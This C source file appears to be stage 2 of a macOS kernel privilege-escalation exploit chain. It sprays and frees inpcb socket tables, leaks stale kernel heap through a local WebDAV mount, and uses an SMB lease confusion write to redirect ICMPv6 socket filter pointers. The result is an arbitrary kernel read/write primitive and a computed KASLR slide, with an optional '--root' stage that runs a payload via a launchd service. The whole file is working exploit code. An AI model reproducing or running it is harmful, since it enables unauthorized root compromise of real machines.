/*
 * krw.c -- stage-2 kernel R/W implementation (see krw.h for the primitive
 * chain) plus the `auto` driver that runs the whole stage:
 *
 *   spray inpcb table -> free old tables -> webdav stale-heap leak of the
 *   freed table (inpcb pointers) -> probe candidates with the confusion
 *   write to match addresses to our ICMPv6 sockets -> redirect A's
 *   in6p_icmp6filt at B's filter field -> 32-byte kernel R/W window ->
 *   compute KASLR slide via A.inp_pcbinfo (- _ripcbinfo).
 *
 * With --root it continues into root_stage() (root.c).
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <fcntl.h>
#include <getopt.h>
#include <limits.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <netinet/icmp6.h>

#include "offsets.h"
#include "krw.h"
#include "spray.h"

#define DEFAULT_CORRUPT_BIN  "bin/corrupt"
#define DEFAULT_SMB_SERVER   "//guest@127.0.0.1:1445/poc"
#define DEFAULT_WDAV_SERVER  "http://127.0.0.1:8080"
#define DEFAULT_SMB_MOUNT    "/tmp/lpe-smb-mnt"
#define DEFAULT_WDAV_MOUNT   "/tmp/lpe-webdav-mnt"
#define DEFAULT_CTL          "/tmp/lpe-smb-ctl.json"
#define DEFAULT_IDENT_COUNT  256
#define DEFAULT_SPRAY_COUNT  8000
/* IPV6_UNICAST_HOPS only accepts 0..255; identity sockets just need a
 * valid value -- uniqueness during probing comes from the confusion-written
 * marker (0x6000+i), not from these. */
#define HOPS_BASE            1
#define LEAK_FILE            "poc.bin"
#define LEAK_SIZE            (WEBDAV_MAX_READ_VALUE)   /* 0x12d0000 */
#define LEAK_OFFSET          4096

struct krw {
    /* corrupt driver child */
    pid_t   drv_pid;
    int     drv_in;     /* our write end -> child stdin  */
    int     drv_out;    /* our read end  <- child stdout */
    char    ctl_path[PATH_MAX];

    /* identity sockets */
    int     fds[1024];
    int     nfds;
    int     hops_base;

    /* redirect pair */
    int     fd_a, fd_b;
    uint64_t addr_a, addr_b;
    int     redirected;

    /* damaged inpcb addresses to repair on cleanup */
    uint64_t damaged[2048];
    int      ndamaged;

    uint64_t slide;
};

/* ------------------------------------------------------------------ */
/* small helpers                                                       */
/* ------------------------------------------------------------------ */

static int
run_cmd(const char *path, char *const argv[])
{
    pid_t pid = fork();
    int status;

    if (pid < 0)
        return -1;
    if (pid == 0) {
        execv(path, argv);
        _exit(127);
    }
    while (waitpid(pid, &status, 0) < 0) {
        if (errno != EINTR)
            return -1;
    }
    if (WIFEXITED(status))
        return WEXITSTATUS(status);
    return -1;
}

/* ------------------------------------------------------------------ */
/* corrupt-write driver (bin/corrupt --stdio + smb server ctl file)    */
/* ------------------------------------------------------------------ */

/* file-scope buffered stream of the driver child's stdout (one krw per
 * process) */
static FILE *g_drv_stream;

krw_t *
krw_open(const char *corrupt_bin, const char *server_url,
         const char *mount_dir, const char *ctl_path)
{
    krw_t *k = calloc(1, sizeof(*k));
    int in_pipe[2], out_pipe[2];
    char line[128];

    if (k == NULL)
        return NULL;
    k->fd_a = k->fd_b = -1;
    k->hops_base = HOPS_BASE;
    snprintf(k->ctl_path, sizeof(k->ctl_path), "%s", ctl_path);

    if (pipe(in_pipe) || pipe(out_pipe))
        goto fail;

    k->drv_pid = fork();
    if (k->drv_pid < 0)
        goto fail;
    if (k->drv_pid == 0) {
        char *argv[] = { (char *)corrupt_bin, "--stdio", "--stay",
                         "--server", (char *)server_url,
                         "--mount", (char *)mount_dir, NULL };
        dup2(in_pipe[0], STDIN_FILENO);
        dup2(out_pipe[1], STDOUT_FILENO);
        close(in_pipe[0]); close(in_pipe[1]);
        close(out_pipe[0]); close(out_pipe[1]);
        /* child stderr goes to our stderr (driver logging) */
        execv(corrupt_bin, argv);
        _exit(127);
    }
    close(in_pipe[0]);
    close(out_pipe[1]);
    k->drv_in = in_pipe[1];
    k->drv_out = out_pipe[0];
    g_drv_stream = fdopen(k->drv_out, "r");
    if (g_drv_stream == NULL)
        goto fail;

    /* wait for "ready" */
    if (fgets(line, sizeof(line), g_drv_stream) == NULL ||
        strncmp(line, "ready", 5) != 0) {
        fprintf(stderr, "[krw] corrupt driver failed to mount (see above)\n");
        goto fail;
    }
    return k;

fail:
    free(k);
    return NULL;
}

static int
ctl_write(krw_t *k, uint64_t key_hi, uint64_t key_low, uint32_t state,
          uint16_t epoch)
{
    char tmp[PATH_MAX];
    snprintf(tmp, sizeof(tmp), "%s.tmp", k->ctl_path);
    FILE *f = fopen(tmp, "w");
    if (f == NULL)
        return -1;
    fprintf(f, "{\"lease_key_hi\": %llu, \"lease_key_low\": %llu, "
               "\"lease_state\": %u, \"epoch\": %u, \"lease_v1\": false}\n",
            (unsigned long long)key_hi, (unsigned long long)key_low,
            state, epoch);
    fclose(f);
    return rename(tmp, k->ctl_path);
}

int
krw_corrupt_u32(krw_t *k, uint64_t T, uint32_t val, uint16_t epoch,
                uint64_t key_hi, uint64_t key_low)
{
    uint64_t K = T - LEASE_OFF_STATE;   /* K+0x2c == T */
    char req[64], resp[128];

    if (ctl_write(k, key_hi, key_low, val, epoch) != 0) {
        fprintf(stderr, "[krw] ctl write failed: %s\n", strerror(errno));
        return -1;
    }
    /* tiny delay so the server re-reads the ctl file before the request */
    usleep(20 * 1000);

    snprintf(req, sizeof(req), "0x%llx\n", (unsigned long long)K);
    if (write(k->drv_in, req, strlen(req)) < 0)
        return -1;
    if (fgets(resp, sizeof(resp), g_drv_stream) == NULL)
        return -1;
    if (strncmp(resp, "done", 4) != 0)
        return -1;
    return 0;
}

/* ------------------------------------------------------------------ */
/* identity sockets                                                    */
/* ------------------------------------------------------------------ */

int
krw_identity_open(krw_t *k, int n, int hops_base)
{
    int i;

    k->hops_base = hops_base;
    for (i = 0; i < n && k->nfds < (int)(sizeof(k->fds)/sizeof(k->fds[0]));
         i++) {
        int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
        int hops = hops_base + (k->nfds % 254);   /* stay within 1..254 */
        if (fd < 0) {
            fprintf(stderr, "[krw] socket %d: %s\n", i, strerror(errno));
            break;
        }
        if (setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS,
                       &hops, sizeof(hops)) != 0) {
            fprintf(stderr, "[krw] setsockopt hops: %s\n", strerror(errno));
            close(fd);
            break;
        }
        k->fds[k->nfds++] = fd;
    }
    fprintf(stderr, "[krw] identity set: %d ICMPv6 dgram sockets "
            "(hops %d..%d)\n", k->nfds, hops_base,
            hops_base + (k->nfds ? (k->nfds - 1) % 254 : 0));
    return k->nfds;
}

static int
fd_from_marker(krw_t *k, uint32_t marker)
{
    int i;
    for (i = 0; i < k->nfds; i++) {
        int hops = 0;
        socklen_t len = sizeof(hops);
        if (getsockopt(k->fds[i], IPPROTO_IPV6, IPV6_UNICAST_HOPS,
                       &hops, &len) == 0 &&
            (uint32_t)(hops & 0xffff) == (marker & 0xffff))
            return k->fds[i];
    }
    return -1;
}

int
krw_probe_inpcb(krw_t *k, uint64_t P, uint32_t marker, uint64_t *addr_out)
{
    /* K = P+0x128: gates *(P+0x130)==0 (options, NULL for fresh sockets),
     * keys u64@(P+0x158) = hash_element (0), u64@(P+0x160) = saved_ppcb (0).
     * Writes: hops @ P+0x154 = marker; filt @ P+0x148 |= 0x80 (repaired
     * later); outputopts/moptions (P+0x138/0x140) zeroed (already NULL). */
    int fd;

    if (krw_corrupt_u32(k, P + INPCB_OFF_HOPS, marker, 0, 0, 0) != 0)
        return -1;
    fd = fd_from_marker(k, marker);
    if (fd >= 0) {
        *addr_out = P;
        if (k->ndamaged < (int)(sizeof(k->damaged)/sizeof(k->damaged[0])))
            k->damaged[k->ndamaged++] = P;
    }
    return fd;
}

/* ------------------------------------------------------------------ */
/* the redirect + R/W window                                           */
/* ------------------------------------------------------------------ */

int
krw_redirect(krw_t *k, int fdA, uint64_t A, int fdB, uint64_t B)
{
    uint32_t hi = (uint32_t)((B + INPCB_IN6P_ICMP6FILT) >> 32);
    uint32_t lo = (uint32_t)(B + INPCB_IN6P_ICMP6FILT);
    uint64_t hops_a;
    struct icmp6_filter filt;
    socklen_t flen;
    int hops = 0;
    socklen_t hlen = sizeof(hops);

    k->fd_a = fdA; k->addr_a = A;
    k->fd_b = fdB; k->addr_b = B;

    if (getsockopt(fdA, IPPROTO_IPV6, IPV6_UNICAST_HOPS,
                   &hops, &hlen) != 0) {
        fprintf(stderr, "[krw] get hops A: %s\n", strerror(errno));
        return -1;
    }
    hops_a = (uint64_t)(hops & 0xffff);  /* u64@(A+0x154) = hops|hash<<32,
                                            hash_element == 0 */
    fprintf(stderr, "[krw] A=0x%llx (fd %d, hops 0x%x)  B=0x%llx (fd %d)\n",
            (unsigned long long)A, fdA, hops & 0xffff,
            (unsigned long long)B, fdB);

    /* step 1: high half of A.filt.
     * K = A+0x120: gate *(A+0x128)==0 (route cache), keys
     *   u64@(A+0x150) = cksum (0xffffffff) | hops<<32? NO: cksum is 4 bytes
     *   at 0x150, hops 2 bytes at 0x154, pad 2, so u64@(A+0x150) =
     *   0xffffffff | (hops_a << 32) | (hash<<48)... hash==0 -> */
    {
        uint64_t key_hi = 0xffffffffULL | ((hops_a & 0xffffULL) << 32);
        uint64_t key_low = 0;   /* u64@(A+0x158) = hash_element|pad+saved? */
        if (krw_corrupt_u32(k, A + 0x14c, hi, 0, key_hi, key_low) != 0)
            return -1;
    }

    /* verify step 1: getsockopt(A, ICMP6_FILTER) must now fail (filt points
     * at hi<<32 | orig_lo -> unmapped) */
    flen = sizeof(filt);
    errno = 0;
    if (getsockopt(fdA, IPPROTO_ICMPV6, ICMP6_FILTER, &filt, &flen) == 0) {
        fprintf(stderr, "[krw] redirect step1 NOT effective "
                "(filter still readable) -- keys wrong?\n");
        return -1;
    }
    fprintf(stderr, "[krw] step1 ok: A.filt high = 0x%08x "
            "(getsockopt now fails: %s)\n", hi, strerror(errno));

    /* step 2: low half of A.filt.
     * K = A+0x11c: gate *(A+0x124)==0 (route), keys
     *   u64@(A+0x14c) = the hi value we just wrote,
     *   u64@(A+0x154) = hops_a (hash_element == 0). */
    if (krw_corrupt_u32(k, A + 0x148, lo, 0, hi, hops_a) != 0)
        return -1;

    /* verify step 2: A.filt == B+0x148 -> getsockopt(A) reads B's
     * filt/cksum/hops region: cksum must read back as 0xffffffff */
    flen = sizeof(filt);
    if (getsockopt(fdA, IPPROTO_ICMPV6, ICMP6_FILTER, &filt, &flen) != 0) {
        fprintf(stderr, "[krw] redirect step2 NOT effective: %s\n",
                strerror(errno));
        return -1;
    }
    {
        const uint32_t *w = (const uint32_t *)&filt;
        fprintf(stderr, "[krw] step2: A reads B+0x148: "
                "%08x %08x %08x %08x ...\n", w[0], w[1], w[2], w[3]);
        if (w[2] != INPCB_FRESH_CKSUM) {
            fprintf(stderr, "[krw] unexpected B.cksum 0x%08x "
                    "(want 0xffffffff) -- aborting before damage\n", w[2]);
            return -1;
        }
    }

    k->redirected = 1;

    /* compute the KASLR slide via A.inp_pcbinfo == &ripcbinfo (static) */
    {
        uint8_t buf[32];
        if (krw_read32(k, A + INPCB_OFF_PCBINFO, buf) == 0) {
            uint64_t pcbinfo;
            memcpy(&pcbinfo, buf, 8);
            k->slide = pcbinfo - XNU_RIPCBINFO;
            fprintf(stderr, "[krw] &ripcbinfo = 0x%llx -> KASLR slide "
                    "0x%llx\n", (unsigned long long)pcbinfo,
                    (unsigned long long)k->slide);
        }
    }
    return 0;
}

static int
window_payload(krw_t *k, uint64_t target, uint8_t out[32])
{
    /* 32 bytes written at B+0x148: filt ptr + preserved fields */
    int hops = 0;
    socklen_t hlen = sizeof(hops);
    uint64_t saved = 0;

    if (getsockopt(k->fd_b, IPPROTO_IPV6, IPV6_UNICAST_HOPS,
                   &hops, &hlen) != 0)
        return -1;

    memset(out, 0, 32);
    memcpy(out + 0, &target, 8);                        /* B+0x148 filt   */
    *(uint32_t *)(out + 8)  = INPCB_FRESH_CKSUM;        /* B+0x150 cksum  */
    *(uint16_t *)(out + 12) = (uint16_t)hops;           /* B+0x154 hops   */
    /* +14 pad, +16 hash_element, +20 pad: zero */
    memcpy(out + 24, &saved, 8);                        /* B+0x160 saved  */
    return 0;
}

int
krw_read32(krw_t *k, uint64_t addr, uint8_t out[32])
{
    uint8_t w[32];
    struct icmp6_filter filt;
    socklen_t flen = sizeof(filt);

    if (!k->redirected)
        return -1;
    if (window_payload(k, addr, w) != 0)
        return -1;
    if (setsockopt(k->fd_a, IPPROTO_ICMPV6, ICMP6_FILTER, w,
                   sizeof(w)) != 0) {
        fprintf(stderr, "[krw] set-window(0x%llx): %s\n",
                (unsigned long long)addr, strerror(errno));
        return -1;
    }
    if (getsockopt(k->fd_b, IPPROTO_ICMPV6, ICMP6_FILTER, &filt,
                   &flen) != 0) {
        fprintf(stderr, "[krw] read32(0x%llx): %s\n",
                (unsigned long long)addr, strerror(errno));
        return -1;
    }
    memcpy(out, &filt, 32);
    return 0;
}

int
krw_write32(krw_t *k, uint64_t addr, const uint8_t data[32])
{
    uint8_t w[32];

    if (!k->redirected)
        return -1;
    if (window_payload(k, addr, w) != 0)
        return -1;
    if (setsockopt(k->fd_a, IPPROTO_ICMPV6, ICMP6_FILTER, w,
                   sizeof(w)) != 0)
        return -1;
    if (setsockopt(k->fd_b, IPPROTO_ICMPV6, ICMP6_FILTER, data,
                   ICMP6_FILTER_SIZE) != 0) {
        fprintf(stderr, "[krw] write32(0x%llx): %s\n",
                (unsigned long long)addr, strerror(errno));
        return -1;
    }
    return 0;
}

uint64_t
krw_read64(krw_t *k, uint64_t addr)
{
    uint8_t buf[32];
    uint64_t v = 0;

    if (krw_read32(k, addr & ~7ULL, buf) != 0)
        return 0;
    memcpy(&v, buf + (addr & 7), 8);
    return v;
}

uint32_t
krw_read32u(krw_t *k, uint64_t addr)
{
    uint8_t buf[32];
    uint32_t v = 0;

    if (krw_read32(k, addr & ~7ULL, buf) != 0)
        return 0;
    memcpy(&v, buf + (addr & 7), 4);
    return v;
}

int
krw_write64(krw_t *k, uint64_t addr, uint64_t val)
{
    uint8_t buf[32];
    uint64_t base = addr & ~7ULL;
    unsigned off = addr & 7;

    if (off) {
        /* read-modify-write the two covered qwords */
        if (krw_read32(k, base, buf) != 0)
            return -1;
        memcpy(buf + off, &val, 8 > 8 - off ? 8 - off : 8);
        if (krw_write32(k, base, buf) != 0)
            return -1;
        if (8 - off < 8) {
            if (krw_read32(k, base + 8, buf) != 0)
                return -1;
            memcpy(buf, (uint8_t *)&val + (8 - off), off);
            if (krw_write32(k, base + 8, buf) != 0)
                return -1;
        }
        return 0;
    }
    memset(buf, 0, sizeof(buf));
    memcpy(buf, &val, 8);
    return krw_write32(k, base, buf);
}

uint64_t krw_slide(krw_t *k)     { return k->slide; }
int      krw_fd_a(krw_t *k)      { return k->fd_a; }
int      krw_fd_b(krw_t *k)      { return k->fd_b; }
uint64_t krw_addr_a(krw_t *k)    { return k->addr_a; }
uint64_t krw_addr_b(krw_t *k)    { return k->addr_b; }

/* ------------------------------------------------------------------ */
/* cleanup: repair every inpcb we damaged so process exit / socket     */
/* close does not panic the kernel                                     */
/* ------------------------------------------------------------------ */

void
krw_cleanup(krw_t *k)
{
    int i;

    if (k->redirected) {
        /* A: outputopts / moptions got |= 0x80 during redirect; filt points
         * at B+0x148.  B: filt points at the last window target. */
        krw_write64(k, k->addr_a + INPCB_IN6P_OUTPUTOPTS, 0);
        krw_write64(k, k->addr_a + INPCB_IN6P_MOPTIONS, 0);
        krw_write64(k, k->addr_a + INPCB_IN6P_ICMP6FILT, 0);
        krw_write64(k, k->addr_b + INPCB_IN6P_ICMP6FILT, 0);
        k->redirected = 0;
    }
    /* probed sockets had filt |= 0x80 (and hops changed, harmless) */
    for (i = 0; i < k->ndamaged; i++) {
        if (k->damaged[i] == k->addr_a || k->damaged[i] == k->addr_b)
            continue;
        krw_write64(k, k->damaged[i] + INPCB_IN6P_ICMP6FILT, 0);
    }
}

void
krw_close(krw_t *k)
{
    int i;
    if (k == NULL)
        return;
    krw_cleanup(k);
    if (k->drv_in >= 0) {
        (void)!write(k->drv_in, "quit\n", 5);
        close(k->drv_in);
    }
    for (i = 0; i < k->nfds; i++)
        close(k->fds[i]);
    free(k);
}

/* ------------------------------------------------------------------ */
/* in-process webdav stale-heap leak (stage-0 core, trimmed: collects  */
/* unique kernel-data-pointer qwords that could be inpcb addresses)    */
/* ------------------------------------------------------------------ */

static void
wdav_unmount(const char *mnt)
{
    char *a1[] = { "umount", (char *)mnt, NULL };
    char *a2[] = { "diskutil", "unmount", "force", (char *)mnt, NULL };
    if (run_cmd("/sbin/umount", a1) != 0)
        run_cmd("/usr/bin/diskutil", a2);
}

static int
wdav_leak_candidates(const char *server, const char *mnt,
                     uint64_t **out, size_t *out_n)
{
    char *argv[] = { "mount_webdav", "-s", (char *)server, (char *)mnt,
                     NULL };
    char path[PATH_MAX];
    struct stat st;
    uint8_t *buf = NULL;
    uint64_t *cand = NULL;
    size_t ncand = 0, cap = 0;
    int i, fd = -1, rc = -1;
    ssize_t got;

    if (mkdir(mnt, 0755) < 0 && errno != EEXIST)
        return -1;
    wdav_unmount(mnt);
    if (run_cmd("/sbin/mount_webdav", argv) != 0)
        return -1;

    snprintf(path, sizeof(path), "%s/%s", mnt, LEAK_FILE);
    for (i = 0; i < 100; i++) {
        if (stat(path, &st) == 0)
            break;
        usleep(100 * 1000);
    }
    if (i == 100)
        goto out;

    fd = open(path, O_RDONLY);
    if (fd < 0)
        goto out;

    buf = malloc(LEAK_SIZE);
    if (buf == NULL)
        goto out;

    got = pread(fd, buf, LEAK_SIZE, LEAK_OFFSET);
    if (got <= 0) {
        fprintf(stderr, "[krw] leak pread: %s\n", strerror(errno));
        goto out;
    }
    fprintf(stderr, "[krw] leaked %zd bytes, scanning for inpcb-table "
            "pointers\n", got);

    for (i = 0; i + 8 <= got; i += 8) {
        uint64_t v;
        size_t j;
        int seen;
        memcpy(&v, buf + i, 8);
        /* kernel data pointer shape, 16-byte aligned (zone element) */
        if ((v >> 48) != 0xffff || (v & 0xf) != 0)
            continue;
        seen = 0;
        for (j = 0; j < ncand; j++) {
            if (cand[j] == v) { seen = 1; break; }
        }
        if (seen)
            continue;
        if (ncand == cap) {
            cap = cap ? cap * 2 : 4096;
            uint64_t *nc = realloc(cand, cap * sizeof(uint64_t));
            if (nc == NULL)
                goto out;
            cand = nc;
        }
        cand[ncand++] = v;
    }
    fprintf(stderr, "[krw] %zu unique candidate pointers\n", ncand);

    /* Clustering filter: inpcb zone elements cluster tightly, so drop
     * outliers far from the median.  Probing an unmapped candidate faults
     * inside the kext (lease-key compare) and panics the box -- this is
     * the main reliability knob. */
    if (ncand > 8) {
        uint64_t *sorted = malloc(ncand * sizeof(uint64_t));
        if (sorted != NULL) {
            size_t kept = 0;
            uint64_t median, lo, hi;
            memcpy(sorted, cand, ncand * sizeof(uint64_t));
            /* insertion sort is fine for a few thousand entries */
            for (size_t a = 1; a < ncand; a++) {
                uint64_t x = sorted[a];
                ssize_t b = (ssize_t)a - 1;
                while (b >= 0 && sorted[b] > x) {
                    sorted[b + 1] = sorted[b];
                    b--;
                }
                sorted[b + 1] = x;
            }
            median = sorted[ncand / 2];
            free(sorted);
            lo = median - 0x10000000ULL;    /* +/- 256 MB */
            hi = median + 0x10000000ULL;
            for (size_t a = 0; a < ncand; a++) {
                if (cand[a] >= lo && cand[a] <= hi)
                    cand[kept++] = cand[a];
            }
            fprintf(stderr, "[krw] clustering: %zu -> %zu candidates "
                    "(median 0x%llx)\n", ncand, kept,
                    (unsigned long long)median);
            ncand = kept;
            if (ncand == 0)
                goto out;
        }
    }
    rc = 0;

out:
    free(buf);
    if (fd >= 0)
        close(fd);
    wdav_unmount(mnt);
    rmdir(mnt);
    if (rc == 0) {
        *out = cand;
        *out_n = ncand;
    } else {
        free(cand);
    }
    return rc;
}

/* ------------------------------------------------------------------ */
/* auto driver                                                         */
/* ------------------------------------------------------------------ */

/* A real leaked ripcb table is an array of pointers into the inpcb zone:
 * nearly all entries sit inside one tight window.  Garbage leaks don't. */
static int
leak_looks_like_table(const uint64_t *cand, size_t ncand)
{
    const uint64_t WINDOW = 0x1000000ULL;   /* 16 MB */
    size_t i, j, best = 0;

    if (ncand < 200)
        return 0;
    for (i = 0; i < ncand; i++) {
        size_t n = 0;
        for (j = 0; j < ncand; j++) {
            if (cand[j] >= cand[i] && cand[j] < cand[i] + WINDOW)
                n++;
        }
        if (n > best)
            best = n;
    }
    fprintf(stderr, "[krw] leak quality: %zu/%zu candidates in one 16 MB "
            "window\n", best, ncand);
    return best * 5 >= ncand * 3;   /* >= 60% clustered */
}

static void
usage(const char *prog)
{
    fprintf(stderr,
        "usage: %s auto [options]\n"
        "\n"
        "  auto            run the whole stage-2 chain\n"
        "    --corrupt PATH   corrupt driver binary (default %s)\n"
        "    --smb URL        smb server URL (default %s)\n"
        "    --webdav URL     webdav server URL (default %s)\n"
        "    --smb-mount DIR  (default %s)\n"
        "    --wdav-mount DIR (default %s)\n"
        "    --ctl PATH       smb server ctl file (default %s)\n"
        "    --ident N        identity sockets (default %d)\n"
        "    --spray N        table-spray sockets (default %d)\n"
        "    --max-probes N   cap confusion probes (default 4000)\n"
        "    --root PAYLOAD   continue into the root stage with this\n"
        "                     payload script path\n"
        "    --trigger NAME   launchd mach service to trigger\n"
        "                     (default com.apple.dvdplayback.setregion_service)\n",
        prog, DEFAULT_CORRUPT_BIN, DEFAULT_SMB_SERVER, DEFAULT_WDAV_SERVER,
        DEFAULT_SMB_MOUNT, DEFAULT_WDAV_MOUNT, DEFAULT_CTL,
        DEFAULT_IDENT_COUNT, DEFAULT_SPRAY_COUNT);
}

int
main(int argc, char **argv)
{
    static const struct option long_opts[] = {
        { "corrupt",    required_argument, NULL, 'c' },
        { "smb",        required_argument, NULL, 's' },
        { "webdav",     required_argument, NULL, 'w' },
        { "smb-mount",  required_argument, NULL, 'S' },
        { "wdav-mount", required_argument, NULL, 'W' },
        { "ctl",        required_argument, NULL, 'f' },
        { "ident",      required_argument, NULL, 'i' },
        { "spray",      required_argument, NULL, 'n' },
        { "max-probes", required_argument, NULL, 'p' },
        { "root",       required_argument, NULL, 'r' },
        { "trigger",    required_argument, NULL, 't' },
        { "help",       no_argument,       NULL, 'h' },
        { NULL, 0, NULL, 0 }
    };
    const char *corrupt_bin = DEFAULT_CORRUPT_BIN;
    const char *smb_url = DEFAULT_SMB_SERVER;
    const char *wdav_url = DEFAULT_WDAV_SERVER;
    const char *smb_mnt = DEFAULT_SMB_MOUNT;
    const char *wdav_mnt = DEFAULT_WDAV_MOUNT;
    const char *ctl = DEFAULT_CTL;
    const char *payload = NULL;
    const char *trigger = "com.apple.dvdplayback.setregion_service";
    int ident = DEFAULT_IDENT_COUNT, spray_n = DEFAULT_SPRAY_COUNT;
    int max_probes = 4000;
    int ch, rc = 1;
    krw_t *k = NULL;
    uint64_t *cand = NULL;
    size_t ncand = 0;

    if (argc < 2 || strcmp(argv[1], "auto") != 0) {
        usage(argv[0]);
        return 2;
    }

    /* we need ~8k sockets for the spray; default soft limit is 256 */
    {
        struct rlimit rl;
        if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur < 10240) {
            rl.rlim_cur = (rl.rlim_max == RLIM_INFINITY ||
                           rl.rlim_max > 10240) ? 10240 : rl.rlim_max;
            if (setrlimit(RLIMIT_NOFILE, &rl) != 0)
                fprintf(stderr, "[krw] warning: cannot raise RLIMIT_NOFILE: "
                        "%s (spray may fail)\n", strerror(errno));
        }
    }
    optind = 2;
    while ((ch = getopt_long(argc, argv, "c:s:w:S:W:f:i:n:p:r:t:h",
                             long_opts, NULL)) != -1) {
        switch (ch) {
        case 'c': corrupt_bin = optarg; break;
        case 's': smb_url = optarg; break;
        case 'w': wdav_url = optarg; break;
        case 'S': smb_mnt = optarg; break;
        case 'W': wdav_mnt = optarg; break;
        case 'f': ctl = optarg; break;
        case 'i': ident = atoi(optarg); break;
        case 'n': spray_n = atoi(optarg); break;
        case 'p': max_probes = atoi(optarg); break;
        case 'r': payload = optarg; break;
        case 't': trigger = optarg; break;
        case 'h':
        default:
            usage(argv[0]);
            return ch == 'h' ? 0 : 2;
        }
    }

    /* 1. identity set (survives the whole stage) */
    k = krw_open(corrupt_bin, smb_url, smb_mnt, ctl);
    if (k == NULL)
        return 1;
    if (krw_identity_open(k, ident, HOPS_BASE) < 2) {
        fprintf(stderr, "[krw] need at least 2 identity sockets\n");
        goto out;
    }

    /* 2+3. spray + stale-heap leak, with a quality gate: only probe when
     *    the leaked buffer really looks like the freed inpcb table (most
     *    candidates inside one tight 16 MB window).  Probing garbage
     *     candidates makes the kext dereference unmapped memory = panic. */
    {
        int attempt;
        int good = 0;

        for (attempt = 0; attempt < 6 && !good; attempt++) {
            inpcb_spray_t *sp;

            if (attempt > 0)
                fprintf(stderr, "[krw] retrying spray+leak "
                        "(attempt %d/6)\n", attempt + 1);

            sp = inpcb_spray_start(spray_n);
            if (sp == NULL) {
                fprintf(stderr, "[krw] spray failed\n");
                goto out;
            }
            fprintf(stderr, "[krw] sprayed %d sockets, freeing\n",
                    inpcb_spray_count(sp));
            inpcb_spray_destroy(sp);

            free(cand);
            cand = NULL;
            ncand = 0;
            if (wdav_leak_candidates(wdav_url, wdav_mnt, &cand, &ncand) != 0) {
                fprintf(stderr, "[krw] leak failed\n");
                continue;
            }
            good = leak_looks_like_table(cand, ncand);
            if (!good)
                fprintf(stderr, "[krw] leak does not look like the inpcb "
                        "table -- NOT probing it (would panic)\n");
        }
        if (!good) {
            fprintf(stderr, "[krw] could not get a usable leak; aborting "
                    "before the dangerous stage\n");
            goto out;
        }
    }

    /* 4. probe candidates until two identity sockets are matched */
    {
        size_t i;
        int fdA = -1, fdB = -1;
        uint64_t A = 0, B = 0;
        int probes = 0;

        for (i = 0; i < ncand && probes < max_probes; i++) {
            uint64_t addr = 0;
            uint32_t marker = 0x6000 + (uint32_t)i;
            int fd = krw_probe_inpcb(k, cand[i], marker, &addr);
            probes++;
            if (fd >= 0) {
                fprintf(stderr, "[krw] HIT: fd %d @ 0x%llx "
                        "(candidate %zu/%zu)\n", fd,
                        (unsigned long long)addr, i + 1, ncand);
                if (fdA < 0) {
                    fdA = fd; A = addr;
                } else if (fd != fdA) {
                    fdB = fd; B = addr;
                    break;
                }
            }
        }
        fprintf(stderr, "[krw] probes done (%d)\n", probes);
        if (fdB < 0) {
            fprintf(stderr, "[krw] failed to match 2 live inpcb\n");
            goto out;
        }

        /* 5. redirect + slide */
        if (krw_redirect(k, fdA, A, fdB, B) != 0)
            goto out;
        fprintf(stderr, "[krw] KERNEL R/W ESTABLISHED, slide 0x%llx\n",
                (unsigned long long)k->slide);

        /* 6. optional root stage */
        if (payload != NULL) {
            if (root_stage(k, payload, trigger) != 0) {
                fprintf(stderr, "[krw] root stage failed\n");
                goto out;
            }
        }
    }

    rc = 0;

out:
    free(cand);
    krw_close(k);
    return rc;
}
